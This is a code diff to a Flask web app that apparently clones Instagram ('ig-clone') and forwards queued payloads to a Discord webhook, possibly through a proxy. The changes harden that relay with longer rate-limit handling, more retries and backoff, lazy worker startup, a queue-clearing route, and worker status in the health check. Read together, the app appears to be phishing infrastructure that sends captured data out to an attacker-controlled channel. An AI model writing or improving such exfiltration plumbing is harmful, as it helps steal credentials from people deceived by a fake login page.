@@ -10,7 +10,7 @@ from flask import (Flask, Response, jsonify, redirect, render_template,
                    render_template_string, request, url_for)
 from jinja2 import TemplateNotFound
 
-BUILD = "v3-discord-ua"
+BUILD = "v4-lazy-worker"
 
 app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "ig-clone-" + str(random.random()))
@@ -135,10 +135,17 @@ def _discord_send(payload, timeout=8):
     wait = 0.0
     if r.status_code == 429:
         try:
-            wait = float(r.json().get("retry_after", 1.5))
+            wait = float(r.json().get("retry_after", 0))
         except Exception:
-            wait = 1.5
-        wait = min(max(wait, 0.5), 15.0)
+            wait = 0.0
+        if not wait:
+            try:
+                wait = float(r.headers.get("Retry-After", 0))
+            except Exception:
+                wait = 0.0
+        if not wait:
+            wait = 5.0
+        wait = min(max(wait, 1.0), 60.0)
 
     print("discord %s: %s" % (r.status_code, body), flush=True)
     res = {"ok": False, "status": r.status_code, "body": body,
@@ -154,6 +161,7 @@ def _remember(res):
 
 
 def _enqueue(payload):
+    _ensure_worker()
     with _queue_lock:
         if len(_queue) < 300:
             _queue.append({"payload": payload, "next": time.time(), "tries": 0})
@@ -174,8 +182,8 @@ def _worker():
             if res["ok"]:
                 continue
             item["tries"] += 1
-            if item["tries"] < 12:
-                backoff = res.get("wait") or min(5 * (2 ** item["tries"]), 300)
+            if item["tries"] < 25:
+                backoff = res.get("wait") or min(10 * (1.6 ** item["tries"]), 600)
                 item["next"] = time.time() + backoff
                 with _queue_lock:
                     _queue.append(item)
@@ -183,7 +191,24 @@ def _worker():
                 print("discord dropped: %s" % res["body"][:120], flush=True)
 
 
-threading.Thread(target=_worker, daemon=True).start()
+_worker_started = False
+_worker_start_lock = threading.Lock()
+
+
+def _ensure_worker():
+    global _worker_started
+    if _worker_started:
+        return
+    with _worker_start_lock:
+        if _worker_started:
+            return
+        _worker_started = True
+    threading.Thread(target=_worker, daemon=True).start()
+
+
+@app.before_request
+def _boot_worker():
+    _ensure_worker()
 
 
 def _clip(value, limit=1000):
@@ -467,6 +492,14 @@ def discord_test():
     return jsonify(res)
 
 
+@app.route("/queue-clear")
+def queue_clear():
+    with _queue_lock:
+        n = len(_queue)
+        _queue.clear()
+    return jsonify({"cleared": n})
+
+
 @app.route("/healthz")
 def healthz():
     base = os.path.join(app.root_path, "templates")
@@ -481,6 +514,8 @@ def healthz():
         "webhook_length": len(DISCORD_WEBHOOK),
         "using_proxy": bool(DISCORD_PROXY),
         "queue": len(_queue),
+        "worker_alive": _worker_started,
+        "pid": os.getpid(),
         "last_discord": dict(_last),
         "strict": STRICT,
     })
